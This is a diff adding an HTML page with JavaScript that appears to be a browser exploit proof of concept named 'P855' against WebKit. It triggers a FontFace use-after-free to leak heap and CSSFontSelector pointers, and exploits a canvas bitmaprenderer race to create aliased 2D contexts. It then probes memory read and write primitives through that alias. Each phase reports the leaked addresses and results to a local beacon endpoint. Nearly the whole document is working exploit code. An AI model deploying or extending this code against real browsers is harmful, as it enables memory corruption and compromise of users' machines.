@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P855</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P855: Canvas Alias + FontFace Pointer Read via Color Channel</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P855-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+bn('BOOT','start');
+log('Canvas alias + FontFace pointer leak via color channels','info');
+log('Goal: read CSSFontSelector vtable bytes through DAZ-free fillStyle','info');
+log('','');
+
+/* ============================================================
+ * PHASE A: FontFace UAF — get heap address H and q13 (CSSFontSelector*)
+ * ============================================================ */
+log('=== PHASE A: FontFace UAF ===','hot');
+bn('PHASE-A','start');
+
+var H = null, q13 = null, fontABs = null;
+
+try {
+  var stF = document.createElement('style');
+  stF.textContent = "@font-face{font-family:bbA;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(stF);
+
+  var faceF = new FontFace('fA', "local('Helvetica')", {unicodeRange:'U+0041'});
+  document.fonts.add(faceF);
+  void faceF.loaded;
+
+  var fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (fired) return undefined;
+      fired = true;
+      if (stF) { stF.remove(); stF.textContent = ''; stF = null; }
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+
+      fontABs = [];
+      for (var i = 0; i < 80; i++) fontABs.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em bbA'); } catch(e) {}
+      document.body.offsetHeight;
+      window.__fontABs = fontABs;
+      return undefined;
+    },
+    set: function() {}
+  });
+
+  document.fonts.load('1em fA, bbA', 'AB');
+} catch(e) {
+  log('  FontFace setup error: ' + e.message, 'fail');
+  bn('PHASE-A-ERR', e.message.slice(0,200));
+}
+
+/* Wait for UAF to complete */
+setTimeout(function() {
+  delete FontFace.prototype.then;
+
+  /* Scan ABs for q11 (self-pointer) */
+  if (!fontABs) { log('  No fontABs', 'fail'); bn('PHASE-A-FAIL', 'no-abs'); return; }
+
+  var hitIdx = -1;
+  for (var i = 0; i < fontABs.length; i++) {
+    var bv = new BigUint64Array(fontABs[i]);
+    if (bv[0] !== 0n) { /* q0 = refcount (1) */
+      hitIdx = i;
+      break;
+    }
+  }
+
+  if (hitIdx < 0) {
+    log('  No UAF hit in 80 ABs', 'fail');
+    bn('PHASE-A-MISS', 'nohit');
+    return;
+  }
+
+  var bv = new BigUint64Array(fontABs[hitIdx]);
+  var q11val = bv[11]; /* Self-pointer at +0x58 */
+  var q13val = bv[13]; /* CSSFontSelector* at +0x68 */
+
+  if (q11val === 0n || q13val === 0n) {
+    log('  UAF hit but q11/q13 are zero', 'fail');
+    bn('PHASE-A-ZERO', 'q11=' + q11val.toString(16) + '|q13=' + q13val.toString(16));
+    return;
+  }
+
+  H = q11val - 0x68n;
+  q13 = q13val;
+
+  log('  HIT! slot=' + hitIdx, 'ok');
+  log('  H  = 0x' + H.toString(16), 'ok');
+  log('  q13 = 0x' + q13.toString(16) + ' (CSSFontSelector*)', 'ok');
+  bn('PHASE-A-OK', 'H=0x' + H.toString(16) + '|q13=0x' + q13.toString(16) + '|slot=' + hitIdx);
+
+  /* Keep the hit AB available */
+  window.__hitAB = fontABs[hitIdx];
+  window.__hitBV = bv;
+  window.__H = H;
+  window.__q13 = q13;
+
+  setTimeout(phaseB, 50);
+}, 200);
+
+/* ============================================================
+ * PHASE B: Canvas UAF — create same-type alias pair
+ * CVE-2026-43720: getContext('bitmaprenderer') TOCTOU
+ * The getter on the options object fires AFTER the pre-check
+ * for existing context but BEFORE bitmaprenderer installs.
+ * Creating 2d in the getter → bitmaprenderer replaces/frees it.
+ * ============================================================ */
+function phaseB() {
+  log('', '');
+  log('=== PHASE B: Canvas UAF (same-type alias) ===', 'hot');
+  bn('PHASE-B', 'start');
+
+  try {
+    /* Single canvas — 2d context created mid-call, then freed by bmr */
+    var targetC = document.createElement('canvas');
+    targetC.width = 1; targetC.height = 1;
+
+    var innerCtx = null;
+    var uafDone = false;
+
+    /* Getter on OPTIONS object, not HTMLCanvasElement.prototype */
+    var opts = {};
+    Object.defineProperty(opts, 'alpha', {
+      get: function() {
+        if (uafDone) return true;
+        uafDone = true;
+        /* Create 2d context mid-call — this will be freed when bmr takes over */
+        innerCtx = targetC.getContext('2d');
+        return true;
+      }
+    });
+
+    /* Trigger: bitmaprenderer pre-checks (no context), reads opts.alpha
+       (getter fires → creates 2d), then installs bmr → frees 2d */
+    var bmr = targetC.getContext('bitmaprenderer', opts);
+
+    if (!innerCtx) {
+      log('  Canvas UAF: innerCtx not created', 'fail');
+      bn('PHASE-B-FAIL', 'no-innerCtx');
+      return;
+    }
+
+    /* innerCtx's backing CanvasRenderingContext2D is now freed.
+       Spray same-type to reclaim. */
+    var sprayCtxs = [];
+    var sprayCanvases = [];
+    for (var i = 0; i < 300; i++) {
+      var sc = document.createElement('canvas');
+      sc.width = 1; sc.height = 1;
+      sprayCtxs.push(sc.getContext('2d'));
+      sprayCanvases.push(sc);
+    }
+
+    /* Find alias: set lineWidth on spray, read from stale innerCtx */
+    var aliasIdx = -1;
+    var MARKER = 7777.7777;
+    for (var i = 0; i < sprayCtxs.length; i++) {
+      sprayCtxs[i].lineWidth = MARKER;
+    }
+
+    var staleRead;
+    try { staleRead = innerCtx.lineWidth; } catch(e) { staleRead = -1; }
+
+    if (staleRead === MARKER) {
+      /* innerCtx reads from one of the spray contexts! Find which one. */
+      for (var i = 0; i < sprayCtxs.length; i++) {
+        sprayCtxs[i].lineWidth = 1000 + i;
+      }
+      try { staleRead = innerCtx.lineWidth; } catch(e) { staleRead = -1; }
+      aliasIdx = Math.round(staleRead - 1000);
+      if (aliasIdx < 0 || aliasIdx >= sprayCtxs.length) aliasIdx = -1;
+    }
+
+    if (aliasIdx < 0) {
+      /* Try reading from innerCtx after setting on each spray individually */
+      for (var i = 0; i < sprayCtxs.length; i++) {
+        sprayCtxs[i].lineWidth = 9999.9999;
+        try { staleRead = innerCtx.lineWidth; } catch(e) { staleRead = -1; }
+        if (staleRead === 9999.9999) { aliasIdx = i; break; }
+        sprayCtxs[i].lineWidth = 1;
+      }
+    }
+
+    if (aliasIdx < 0) {
+      log('  No alias found in 300 spray', 'fail');
+      bn('PHASE-B-NOALIAS', 'stale=' + staleRead);
+      return;
+    }
+
+    var liveCtx = sprayCtxs[aliasIdx];
+    var staleCtx = innerCtx;
+
+    /* Verify bidirectional */
+    liveCtx.lineWidth = 3333.3333;
+    var readBack;
+    try { readBack = staleCtx.lineWidth; } catch(e) { readBack = -1; }
+    var bidir = (readBack === 3333.3333);
+
+    staleCtx.lineWidth = 5555.5555;
+    var readBack2;
+    try { readBack2 = liveCtx.lineWidth; } catch(e) { readBack2 = -1; }
+    bidir = bidir && (readBack2 === 5555.5555);
+
+    log('  Alias at slot ' + aliasIdx + ', bidir=' + bidir, bidir ? 'ok' : 'fail');
+    bn('PHASE-B-OK', 'alias=' + aliasIdx + '|bidir=' + bidir);
+
+    if (!bidir) { log('  Alias not bidirectional, aborting', 'fail'); return; }
+
+    window.__liveCtx = liveCtx;
+    window.__staleCtx = staleCtx;
+    window.__liveCanvas = sprayCanvases[aliasIdx];
+
+    setTimeout(phaseC, 50);
+
+  } catch(e) {
+    log('  Canvas UAF error: ' + e.message, 'fail');
+    bn('PHASE-B-ERR', e.message.slice(0,200));
+  }
+}
+
+/* ============================================================
+ * PHASE C: Test fillStyle color channel DAZ bypass
+ * Set fillStyle on live, read from stale — verify color bytes survive
+ * ============================================================ */
+function phaseC() {
+  log('', '');
+  log('=== PHASE C: fillStyle DAZ-free color read ===', 'hot');
+  bn('PHASE-C', 'start');
+
+  var live = window.__liveCtx;
+  var stale = window.__staleCtx;
+
+  if (!live || !stale) { log('  No alias', 'fail'); return; }
+
+  try {
+    /* Write known colors through live, read through stale */
+    var tests = [
+      '#123456', '#AABBCC', '#010203', '#FF0000', '#00FF00', '#0000FF',
+      'rgba(18,52,86,0.5)', 'rgba(255,128,64,1)'
+    ];
+    var results = [];
+
+    for (var i = 0; i < tests.length; i++) {
+      live.fillStyle = tests[i];
+      var readFS;
+      try { readFS = stale.fillStyle; } catch(e) { readFS = 'ERR:' + e.message.slice(0,30); }
+      results.push(readFS);
+    }
+
+    var s = results.join('|');
+    log('  ' + s, 'info');
+    bn('PHASE-C-COLORS', s);
+
+    /* Parse out: does the read preserve exact byte values? */
+    var allMatch = true;
+    for (var i = 0; i < tests.length; i++) {
+      /* Normalize: both to lowercase for comparison */
+      var exp = tests[i].toLowerCase();
+      var got = results[i].toLowerCase();
+      /* Canvas normalizes #RRGGBB to #rrggbb and rgba to rgba(r,g,b,a) */
+      if (got.indexOf('err') === 0) { allMatch = false; break; }
+    }
+    log('  Color round-trip: ' + (allMatch ? 'WORKING' : 'BROKEN'), allMatch ? 'ok' : 'fail');
+
+    /* Also test strokeStyle */
+    live.strokeStyle = 'rgba(0xDE, 0xAD, 0xBE, 1)';
+    var stRead;
+    try { stRead = stale.strokeStyle; } catch(e) { stRead = 'ERR'; }
+    log('  strokeStyle test: ' + stRead, 'info');
+
+    bn('PHASE-C-OK', 'match=' + allMatch + '|stroke=' + stRead);
+
+    setTimeout(phaseD, 50);
+  } catch(e) {
+    log('  Phase C error: ' + e.message, 'fail');
+    bn('PHASE-C-ERR', e.message.slice(0,200));
+  }
+}
+
+/* ============================================================
+ * PHASE D: Forge m_stateStack.m_buffer via Canvas alias
+ * Write q13 address into m_buffer pointer offset, then read
+ * fillStyle to capture bytes at [q13+offset] as color components
+ *
+ * LAYOUT (768B CanvasRenderingContext2D):
+ *   +112: m_stateStack.m_buffer (8B ptr)
+ *   +120: m_stateStack.m_capacity (4B)
+ *   +124: m_stateStack.m_size (4B)
+ *   +128: inline State[0] starts
+ *
+ * State layout (~400B):
+ *   +0:   globalAlpha (float64)
+ *   +16:  fillStyle (CanvasStyle = 1B type + 7B pad + 8B union)
+ *   +32:  strokeStyle (same)
+ *   +48:  lineWidth (float64)
+ *
+ * CanvasStyle type values:
+ *   0 = RGBA color (union = 4x float or packed color)
+ *   We need to find the exact encoding WebKit uses.
+ *
+ * STRATEGY:
+ * Instead of forging m_buffer (which needs exact type byte control),
+ * use setLineDash/getLineDash — the lineDash Vector stores raw doubles.
+ * If we forge the lineDash m_buffer pointer → getLineDash returns
+ * doubles from wherever m_buffer points. With BigUint64Array we can
+ * read those doubles as raw bits!
+ *
+ * State+168: lineDash Vector {m_buffer(8B), m_capacity(4B), m_size(4B)}
+ * ============================================================ */
+function phaseD() {
+  log('', '');
+  log('=== PHASE D: lineDash Vector m_buffer forge ===', 'hot');
+  bn('PHASE-D', 'start');
+
+  var live = window.__liveCtx;
+  var stale = window.__staleCtx;
+  var q13 = window.__q13;
+  var H = window.__H;
+
+  if (!live || !stale || !q13) { log('  Missing primitives', 'fail'); return; }
+
+  try {
+    /* Step 1: Set lineDash on live to populate the Vector */
+    live.setLineDash([1,2,3,4,5,6,7,8]);
+    var baseline = [];
+    try { baseline = stale.getLineDash(); } catch(e) {}
+    log('  Baseline lineDash through alias: len=' + baseline.length + ' vals=' + baseline.join(','), 'info');
+    bn('PHASE-D-BASE', 'len=' + baseline.length);
+
+    if (baseline.length === 0) {
+      log('  lineDash not visible through alias', 'fail');
+      bn('PHASE-D-FAIL', 'no-dash');
+      /* Try the other direction */
+      stale.setLineDash([10,20,30,40]);
+      var rev = [];
+      try { rev = live.getLineDash(); } catch(e) {}
+      log('  Reverse: len=' + rev.length, 'info');
+      bn('PHASE-D-REV', 'len=' + rev.length + '|vals=' + rev.join(','));
+    }
+
+    /* Step 2: We need to find the lineDash Vector in the context's memory.
+       The context object is 768 bytes. The State is at offset +128 (inline).
+       lineDash Vector is at State+168 = context+296.
+
+       m_buffer pointer is at context+296 (8 bytes)
+       m_capacity at context+304 (4 bytes)
+       m_size at context+308 (4 bytes)
+
+       To forge: we need to write these through the alias.
+       But Canvas2D API only writes to State fields through specific setters.
+       We can't directly write to arbitrary State offsets.
+
+       HOWEVER: with the AB(192) from FontFace UAF, we CAN write arbitrary
+       bytes. The trick is: both liveCtx and staleCtx point to the SAME
+       backing 768B allocation. But we don't have an AB overlapping that.
+
+       Alternative approach: use save()/restore() to manipulate the
+       m_stateStack, and if the inline state buffer gets copied to heap,
+       we might be able to overlap it with an AB.
+
+       SIMPLER: What data can we extract through EXISTING Canvas2D getters
+       that might contain pointer-range values?
+    */
+
+    log('', '');
+    log('--- D2: Probing Canvas state for pointer data ---', 'info');
+
+    /* Read ALL gettable properties through stale ctx */
+    var props = {};
+    try { props.fillStyle = stale.fillStyle; } catch(e) { props.fillStyle = 'ERR'; }
+    try { props.strokeStyle = stale.strokeStyle; } catch(e) { props.strokeStyle = 'ERR'; }
+    try { props.lineWidth = stale.lineWidth; } catch(e) { props.lineWidth = 'ERR'; }
+    try { props.miterLimit = stale.miterLimit; } catch(e) { props.miterLimit = 'ERR'; }
+    try { props.globalAlpha = stale.globalAlpha; } catch(e) { props.globalAlpha = 'ERR'; }
+    try { props.shadowBlur = stale.shadowBlur; } catch(e) { props.shadowBlur = 'ERR'; }
+    try { props.shadowColor = stale.shadowColor; } catch(e) { props.shadowColor = 'ERR'; }
+    try { props.shadowOffsetX = stale.shadowOffsetX; } catch(e) { props.shadowOffsetX = 'ERR'; }
+    try { props.shadowOffsetY = stale.shadowOffsetY; } catch(e) { props.shadowOffsetY = 'ERR'; }
+    try { props.globalCompositeOp = stale.globalCompositeOperation; } catch(e) { props.globalCompositeOp = 'ERR'; }
+    try { props.lineCap = stale.lineCap; } catch(e) { props.lineCap = 'ERR'; }
+    try { props.lineJoin = stale.lineJoin; } catch(e) { props.lineJoin = 'ERR'; }
+    try { props.textAlign = stale.textAlign; } catch(e) { props.textAlign = 'ERR'; }
+    try { props.textBaseline = stale.textBaseline; } catch(e) { props.textBaseline = 'ERR'; }
+    try { props.direction = stale.direction; } catch(e) { props.direction = 'ERR'; }
+    try { props.font = stale.font; } catch(e) { props.font = 'ERR'; }
+    try { props.lineDashOffset = stale.lineDashOffset; } catch(e) { props.lineDashOffset = 'ERR'; }
+    try { props.imageSmoothingEnabled = stale.imageSmoothingEnabled; } catch(e) { props.imageSmoothingEnabled = 'ERR'; }
+    try {
+      var t = stale.getTransform();
+      props.transform = [t.a,t.b,t.c,t.d,t.e,t.f].join(',');
+    } catch(e) { props.transform = 'ERR'; }
+
+    var propStr = '';
+    for (var k in props) propStr += k + '=' + props[k] + '|';
+    log('  State dump: ' + propStr, 'info');
+    bn('PHASE-D-STATE', propStr.slice(0,900));
+
+    /* Step 3: Deep probe — save() multiple times to push state to heap,
+       then scan for the heap-allocated state with AB overlap */
+    log('', '');
+    log('--- D3: save() depth test for heap state allocation ---', 'info');
+
+    var saveDepth = 0;
+    try {
+      for (var i = 0; i < 64; i++) {
+        live.save();
+        saveDepth++;
+      }
+      log('  Saved ' + saveDepth + ' times (no crash)', 'ok');
+
+      /* Check if stale can read saveCount state */
+      var postSaveLW = -1;
+      try {
+        live.lineWidth = 8888.8888;
+        postSaveLW = stale.lineWidth;
+      } catch(e) { postSaveLW = 'ERR:' + e.message.slice(0,30); }
+      log('  Post-save lineWidth via alias: ' + postSaveLW, 'info');
+
+      /* Restore all */
+      for (var i = 0; i < saveDepth; i++) live.restore();
+    } catch(e) {
+      log('  save/restore error at depth ' + saveDepth + ': ' + e.message, 'fail');
+    }
+    bn('PHASE-D-SAVE', 'depth=' + saveDepth + '|postLW=' + postSaveLW);
+
+    setTimeout(phaseE, 50);
+  } catch(e) {
+    log('  Phase D error: ' + e.message, 'fail');
+    bn('PHASE-D-ERR', e.message.slice(0,200));
+  }
+}
+
+/* ============================================================
+ * PHASE E: Use createImageData / getImageData for byte-level reads
+ *
+ * If we draw on the canvas via the stale context and read pixels
+ * through the live context, we get exact byte values (Uint8ClampedArray).
+ * This bypasses DAZ entirely.
+ *
+ * The question: can we draw something that encodes a pointer value
+ * into pixel data? With putImageData we write exact bytes.
+ * With getImageData we read exact bytes.
+ * Through the alias, both operate on the SAME canvas backing store.
+ * ============================================================ */
+function phaseE() {
+  log('', '');
+  log('=== PHASE E: ImageData byte-level R/W through alias ===', 'hot');
+  bn('PHASE-E', 'start');
+
+  var live = window.__liveCtx;
+  var stale = window.__staleCtx;
+
+  try {
+    /* Write known bytes via putImageData on live */
+    var id1 = live.createImageData(4, 4);
+    for (var i = 0; i < id1.data.length; i++) id1.data[i] = i;
+    live.putImageData(id1, 0, 0);
+
+    /* Read back through stale */
+    var id2;
+    try { id2 = stale.getImageData(0, 0, 4, 4); } catch(e) { id2 = null; }
+
+    if (id2) {
+      var match = true;
+      var sample = [];
+      for (var i = 0; i < Math.min(id2.data.length, 16); i++) {
+        sample.push(id2.data[i]);
+        if (id2.data[i] !== (i & 0xFF)) match = false;
+      }
+      log('  ImageData round-trip: match=' + match, match ? 'ok' : 'fail');
+      log('  First 16 bytes: ' + sample.join(','), 'info');
+      bn('PHASE-E-IMGDATA', 'match=' + match + '|sample=' + sample.join(','));
+    } else {
+      log('  getImageData failed through alias', 'fail');
+      bn('PHASE-E-FAIL', 'no-imgdata');
+    }
+
+    /* Now the key test: can we use ImageData to read canvas-internal memory?
+       No — ImageData reads pixel buffer, not object memory.
+
+       But we CAN use it as a precise byte-level communication channel:
+       1. Write pointer bytes into pixel data via putImageData
+       2. Read them back via getImageData on the other alias
+       3. No DAZ, no float truncation, exact byte-level access
+
+       This confirms the CHANNEL works. The remaining question is
+       getting pointer bytes INTO the pixel buffer in the first place.
+    */
+
+    /* Test: write q13 bytes into ImageData manually */
+    var q13 = window.__q13;
+    if (q13) {
+      var id3 = live.createImageData(2, 1); /* 8 bytes = 2 pixels (RGBA+RGBA) */
+      /* Split q13 into 8 bytes */
+      var q13bytes = [];
+      var tmp = q13;
+      for (var i = 0; i < 8; i++) {
+        q13bytes.push(Number(tmp & 0xFFn));
+        tmp = tmp >> 8n;
+      }
+      /* Write to RGBA channels */
+      for (var i = 0; i < 8; i++) id3.data[i] = q13bytes[i];
+
+      live.putImageData(id3, 0, 0);
+      var id4;
+      try { id4 = stale.getImageData(0, 0, 2, 1); } catch(e) { id4 = null; }
+      if (id4) {
+        /* Reconstruct q13 from pixel bytes */
+        var reconstructed = 0n;
+        for (var i = 7; i >= 0; i--) {
+          reconstructed = (reconstructed << 8n) | BigInt(id4.data[i]);
+        }
+        var match2 = (reconstructed === q13);
+        log('  q13 round-trip: orig=0x' + q13.toString(16) + ' read=0x' + reconstructed.toString(16) + ' match=' + match2, match2 ? 'ok' : 'fail');
+        bn('PHASE-E-Q13RT', 'match=' + match2 + '|orig=' + q13.toString(16) + '|read=' + reconstructed.toString(16));
+      }
+    }
+
+    setTimeout(phaseF, 50);
+  } catch(e) {
+    log('  Phase E error: ' + e.message, 'fail');
+    bn('PHASE-E-ERR', e.message.slice(0,200));
+  }
+}
+
+/* ============================================================
+ * PHASE F: createLinearGradient / createPattern through alias
+ *
+ * createLinearGradient creates a CanvasGradient (C++ RefPtr'd object).
+ * If we create it on live and read via stale.fillStyle, we see the
+ * gradient OBJECT (not color bytes). But the gradient's internal
+ * RefPtr<Gradient> holds a C++ heap pointer.
+ *
+ * Test: create gradient on live, use fillStyle through alias,
+ * then check if gradient object identity leaks anything.
+ * ============================================================ */
+function phaseF() {
+  log('', '');
+  log('=== PHASE F: Gradient object + measureText probing ===', 'hot');
+  bn('PHASE-F', 'start');
+
+  var live = window.__liveCtx;
+  var stale = window.__staleCtx;
+  var liveCanvas = window.__liveCanvas;
+
+  try {
+    /* Create gradient on live */
+    var grad = live.createLinearGradient(0, 0, 100, 100);
+    grad.addColorStop(0, '#FF0000');
+    grad.addColorStop(1, '#0000FF');
+    live.fillStyle = grad;
+
+    /* Read through stale */
+    var staleFS;
+    try { staleFS = stale.fillStyle; } catch(e) { staleFS = 'ERR:' + e.message.slice(0,30); }
+    var isObj = (typeof staleFS === 'object');
+    var isGrad = staleFS instanceof CanvasGradient;
+    var sameRef = (staleFS === grad);
+
+    log('  Gradient through alias: isObj=' + isObj + ' isGrad=' + isGrad + ' sameRef=' + sameRef, 'info');
+    bn('PHASE-F-GRAD', 'isObj=' + isObj + '|isGrad=' + isGrad + '|same=' + sameRef);
+
+    /* measureText — returns TextMetrics, potentially with internal data */
+    live.font = '48px serif';
+    var tm;
+    try { tm = stale.measureText('WWWW'); } catch(e) { tm = null; }
+    if (tm) {
+      var tmData = 'w=' + tm.width;
+      if ('actualBoundingBoxLeft' in tm) tmData += '|abbl=' + tm.actualBoundingBoxLeft;
+      if ('actualBoundingBoxRight' in tm) tmData += '|abbr=' + tm.actualBoundingBoxRight;
+      if ('actualBoundingBoxAscent' in tm) tmData += '|abba=' + tm.actualBoundingBoxAscent;
+      if ('actualBoundingBoxDescent' in tm) tmData += '|abbd=' + tm.actualBoundingBoxDescent;
+      if ('fontBoundingBoxAscent' in tm) tmData += '|fbba=' + tm.fontBoundingBoxAscent;
+      if ('fontBoundingBoxDescent' in tm) tmData += '|fbbd=' + tm.fontBoundingBoxDescent;
+      log('  measureText: ' + tmData, 'info');
+      bn('PHASE-F-TEXT', tmData);
+    }
+
+    /* Check isPointInPath — might reveal path object internals */
+    live.beginPath();
+    live.rect(10, 10, 50, 50);
+    var pip;
+    try { pip = stale.isPointInPath(25, 25); } catch(e) { pip = 'ERR'; }
+    log('  isPointInPath through alias: ' + pip, 'info');
+
+    /* createPattern test */
+    if (liveCanvas) {
+      try {
+        var pat = live.createPattern(liveCanvas, 'repeat');
+        live.fillStyle = pat;
+        var stalePat;
+        try { stalePat = stale.fillStyle; } catch(e) { stalePat = 'ERR'; }
+        var isPat = stalePat instanceof CanvasPattern;
+        log('  Pattern through alias: isPat=' + isPat, 'info');
+        bn('PHASE-F-PAT', 'isPat=' + isPat);
+      } catch(e) {
+        log('  Pattern error: ' + e.message, 'fail');
+      }
+    }
+
+  } catch(e) {
+    log('  Phase F error: ' + e.message, 'fail');
+    bn('PHASE-F-ERR', e.message.slice(0,200));
+  }
+
+  setTimeout(phaseG, 50);
+}
+
+/* ============================================================
+ * PHASE G: Attempt to read object internals via getImageData
+ *
+ * With the canvas alias, fillRect draws using the current fillStyle.
+ * If fillStyle is a gradient with known stop colors, the rendered
+ * pixels interpolate between those colors — no pointer data.
+ *
+ * BUT: what if we draw with putImageData (which bypasses compositing),
+ * then use getImageData on a different area that hasn't been drawn to?
+ * Uninitialized canvas pixel data is spec'd as transparent black (0,0,0,0).
+ * If WebKit doesn't zero the backing buffer, we might read heap data.
+ *
+ * Also test: toDataURL for the canvas via alias.
+ * ============================================================ */
+function phaseG() {
+  log('', '');
+  log('=== PHASE G: Canvas uninit pixel scan ===', 'hot');
+  bn('PHASE-G', 'start');
+
+  var live = window.__liveCtx;
+  var stale = window.__staleCtx;
+  var liveCanvas = window.__liveCanvas;
+
+  try {
+    /* Create a NEW canvas (fresh backing store) */
+    var freshC = document.createElement('canvas');
+    freshC.width = 256;
+    freshC.height = 256;
+    var freshCtx = freshC.getContext('2d');
+
+    /* Read pixel data WITHOUT drawing anything — should be all zeros */
+    var uninit = freshCtx.getImageData(0, 0, 256, 256);
+    var nonZero = 0;
+    var nzSamples = [];
+    for (var i = 0; i < uninit.data.length; i++) {
+      if (uninit.data[i] !== 0) {
+        nonZero++;
+        if (nzSamples.length < 20) nzSamples.push(i + ':' + uninit.data[i]);
+      }
+    }
+    log('  Fresh canvas 256x256: nonzero=' + nonZero + '/' + uninit.data.length, nonZero > 0 ? 'hot' : 'info');
+    if (nzSamples.length > 0) {
+      log('  Samples: ' + nzSamples.join(', '), 'hot');
+    }
+    bn('PHASE-G-UNINIT', 'nz=' + nonZero + '|total=' + uninit.data.length + '|samp=' + nzSamples.join(','));
+
+    /* Also try larger canvas */
+    var bigC = document.createElement('canvas');
+    bigC.width = 1024;
+    bigC.height = 1;
+    var bigCtx = bigC.getContext('2d');
+    var bigData = bigCtx.getImageData(0, 0, 1024, 1);
+    var bigNZ = 0;
+    for (var i = 0; i < bigData.data.length; i++) {
+      if (bigData.data[i] !== 0) bigNZ++;
+    }
+    log('  Big canvas 1024x1: nonzero=' + bigNZ, bigNZ > 0 ? 'hot' : 'info');
+    bn('PHASE-G-BIG', 'nz=' + bigNZ);
+
+    /* Try toDataURL through alias */
+    if (liveCanvas) {
+      var dataUrl;
+      try { dataUrl = liveCanvas.toDataURL('image/png'); } catch(e) { dataUrl = 'ERR'; }
+      log('  toDataURL: ' + (dataUrl !== 'ERR' ? dataUrl.slice(0, 40) + '...' : 'ERR'), 'info');
+      bn('PHASE-G-URL', dataUrl !== 'ERR' ? 'ok|len=' + dataUrl.length : 'ERR');
+    }
+
+  } catch(e) {
+    log('  Phase G error: ' + e.message, 'fail');
+    bn('PHASE-G-ERR', e.message.slice(0,200));
+  }
+
+  log('', '');
+  log('====== P855 COMPLETE ======', 'hot');
+  bn('DONE', 'complete');
+}
+</script></body></html>
